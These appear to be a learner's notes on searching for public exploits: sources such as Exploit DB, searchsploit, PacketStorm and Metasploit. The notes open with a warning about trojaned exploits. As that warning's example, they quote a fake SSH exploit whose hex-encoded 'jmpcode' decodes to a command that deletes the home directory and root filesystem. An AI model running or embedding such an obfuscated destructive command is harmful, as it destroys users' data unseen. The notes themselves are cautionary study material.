NOTES

Word of caution
	dont just download and run any exploit, try to read the code to understand it first

	OpenOwn exploit
		markted as a remote ssh exploit, asked for root privs
			>>> jmpcode = [
			... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
			... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
			>>> print jmpcode
			['rm -rf ~ /* 2> /dev/null &']
		would just delete the entire file system and connected to an irc server to say how silly a person is

Searching for exploits
	online resources
		Exploit DB
			goto, ran by offsec has a cli tool, searchsploit
		SecurityFocus
		PacketStorm
		Search operators
			firefox --search "Microsoft Edge site:exploit-db.com"
	Offline resources
		downloading the exploit db
			sudo apt update && sudo apt install exploitdb
			stored in /usr/share/exploitdb/exploits
			(what searchsploit uses to find exploits from)
		NSE scripts
			/usr/share/nmap/scripts
		MSFConsole
